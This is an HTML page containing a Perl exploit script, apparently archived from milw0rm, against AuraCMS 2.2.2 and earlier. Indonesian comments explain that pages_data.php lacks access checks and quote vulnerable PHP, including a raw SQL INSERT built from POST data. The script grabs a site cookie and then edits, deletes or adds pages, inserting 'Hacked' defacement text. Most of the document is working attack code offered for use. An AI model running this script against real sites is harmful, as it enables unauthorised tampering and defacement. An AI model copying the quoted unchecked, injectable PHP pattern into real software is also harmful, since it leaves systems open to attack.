<html><head><title>AuraCMS <= 2.2.2 (pages_data.php) Arbitrary Edit/Add/Delete Exploit</title></head><pre>#!/usr/bin/perl
# k1tk4t Public Security Advisory
# ////////////////////////////////////////////////////////////
# AuraCMS &lt;= 2.2.2 (pages_data.php) Arbitrary Edit/Add/Delete data halaman exploit 
# Vendor	: http://www.auracms.org/
# Kutu		: ./js/pages/pages_data.php
# Keterangan	: 
# pada berkas pages_data.php dari awal hingga akhir tidak adanya aturan yang jelas, siapa, hak, level
# dalam mengakses berkas ini, kenapa perlu kejelasan aturan untuk berkas ini? 
# karena didalam berkas ini terdapat kode yang dapat menghapus(delete)
# menambahkan(add), mengedit(edit) data halaman didalam database auracms, sehingga
# dengan tidak adanya kejelasan aturan pada berkas pages_data.php ini 
# maka berkas ini mutlak terdapat KUTU yang amat menjijikan.... huee.....   :( 
# potongan kode dari pages_data.php
# --//--
# 03: @ob_start('ob_gzhandler');
# 04: @header(&quot;Content-type: text/plain; charset=utf-8;&quot;);
# 05: @header(&quot;Cache-Control: no-cache, must-revalidate&quot;); // HTTP/1.1
# 06: @header(&quot;Pragma: no-cache&quot;);
# 07:
# 08: include '../../includes/session.php';
# 09: include '../../includes/config.php';
# 10: include '../../includes/fungsi.php';
# 11: include '../../includes/mysql.php';
# 12: include '../../includes/json.php';
# 13:
# 14:
# 15: if (!isset($_SESSION['mod_ajax'])){
# 16: exit;   
# 17: }
# --//--
# Lihat.... tidak ada aturan di baris pertama hingga baris ke 17, mengenai siapa, hak, level dan aturan lainnya
# dalam mengakses berkas ini
# --//--
# 20: switch (@$_GET['action']){
# 21:        
# 22: case 'add':
# 23: $_POST = array_map ('decodeURIComponent',$_POST);
# 24: $judul = $_POST['judul'];
# 25: $konten = $_POST['konten'];
# 26: $open['error'] = false;
# 27: $open['errorpesan'] = '';
# 28: if (!empty($judul) &amp;&amp; !empty($konten)){
# 29: $query = mysql_query (&quot;INSERT INTO `halaman` (`judul`,`konten`) VALUES ('$judul','$konten')&quot;);
# 30: if ($query){
# --//--
# diatas ini satu contoh bagaimana berkas ini berperilaku, lihat... bisa menambahkan data halaman pada database kan... 
# kacoooo, kacoooo,  :( 
# selebihnya liat sendiri yaa... panjang soalnya... :p
#
# Terimakasih untuk ;
# str0ke,DNX,n0c0py,L41n,
# NTOS-Team-&gt;[fl3xu5,opt1lc,sakitjiwa],
# eCHo-&gt;[y3dips,K-159,lirva32,dan staff lainnya] 
use LWP::UserAgent;
use HTTP::Cookies;
use Getopt::Long;

if ( !$ARGV[1] ) {
	print &quot;\n ///////////////////////////////////////////////////////////&quot;;
	print &quot;\n //                ..::&gt; k1tk4t &lt;::..                     //&quot;;
	print &quot;\n //     AuraCMS &lt;= 2.2.2 (pages_data.php)                 //&quot;;
	print &quot;\n //     Arbitrary Edit/Add/Delete data halaman exploit    //&quot;;
	print &quot;\n ///////////////////////////////////////////////////////////&quot;;
	print &quot;\n[!] &quot;;
	print &quot;\n[!] Penggunaan : perl auracms_pagesdata.pl [Site] [Path] [id_halaman] [options]&quot;;
	print &quot;\n[!] Contoh     : perl auracms_pagesdata.pl localhost /toko/ 1 -o 1&quot;;
	print &quot;\n[!] Options : 1=Edit , 2=Delete, 3=Add&quot;;
	print &quot;\n&quot;;
	exit;
}
my $host = $ARGV[0];
my $path = $ARGV[1];
my $idhalaman = $ARGV[2];
my $isijudul = &quot;AuraCMS &lt;= 2.2.2 Hacked&quot;;
my $isikonten = &quot;Mohon Perhatian!!! terdapat kutu pada berkas pages_data.php, Arbitrary Edit-Add-Delete data halaman&quot;;
my $ambilkue = &quot;http://&quot;.$host.$path.&quot;index.php&quot;;
my $browser = LWP::UserAgent-&gt;new;
my $kue = HTTP::Cookies-&gt;new();
my $hasil = &quot;&quot;;
%options = ();
GetOptions(\%options, &quot;o=i&quot;,);
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 1) { 
$arbitrary = &quot;http://&quot;.$host.$path.&quot;js/pages/pages_data.php?action=edit_saved&amp;id=&quot;; 
}
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 2) { 
$arbitrary = &quot;http://&quot;.$host.$path.&quot;js/pages/pages_data.php?action=delete&amp;id=&quot;; 
}
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 3) { 
$arbitrary = &quot;http://&quot;.$host.$path.&quot;js/pages/pages_data.php?action=add&amp;id=&quot;; 
}

$hasil = $browser-&gt;get($arbitrary);
if(!$hasil-&gt;is_success) {
die(&quot;[!] Gagal, berkas pages_data.php tidak tersedia\n&quot;);
}

#  ambil kue dari website
$hasil = $browser-&gt;get($ambilkue);
$kue-&gt;extract_cookies($hasil);
$browser-&gt;cookie_jar($kue);

# arbitrary exploit 
$arbitrary .= $idhalaman;
$hasil = $browser-&gt;post($arbitrary,[&quot;judul&quot;=&gt;$isijudul,&quot;konten&quot;=&gt;$isikonten],);
$konten = $hasil-&gt;content;
print $konten ;

# milw0rm.com [2008-07-09]</pre></html>